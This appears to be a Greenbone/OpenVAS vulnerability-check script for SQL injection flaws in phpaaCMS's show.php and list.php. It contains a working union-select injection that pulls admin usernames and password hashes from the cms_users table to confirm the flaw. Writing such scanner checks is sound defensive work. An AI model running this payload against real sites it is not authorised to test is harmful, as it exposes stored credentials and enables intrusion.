if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801408" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-07-19 10:09:06 +0200 (Mon, 19 Jul 2010)" );
	script_cve_id( "CVE-2010-2719", "CVE-2010-2720" );
	script_bugtraq_id( 41341 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "phpaaCMS 'id' Parameter SQL Injection Vulnerabilities" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/40450" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/14201/" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/14199/" );
	script_xref( name: "URL", value: "http://www.vupen.com/english/advisories/2010/1690" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "insight", value: "The flaws are due to input validation errors in the 'show.php'
  and 'list.php' scripts when processing the 'id' parameter, which could be
  exploited by malicious people to conduct SQL injection attacks." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running phpaaCMS and is prone SQL injection
  vulnerabilities." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to view, add, modify
  or delete information in the back-end database." );
	script_tag( name: "affected", value: "phpaaCMS 0.3.1 UTF-8" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/phpaaCMS", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: NASLString( dir, "/index.php" ), port: port );
	if(ContainsString( res, ">phpAA" )){
		req = http_get( item: NASLString( dir, "/show.php?id=-194%20union%20all%20" + "select%201,2,3,4,5,6,7,8,9,10,concat(username,0x3a,password)" + ",12,13,14,15%20from%20cms_users--" ), port: port );
		res = http_keepalive_send_recv( port: port, data: req );
		if(ContainsString( res, ">admin:" )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

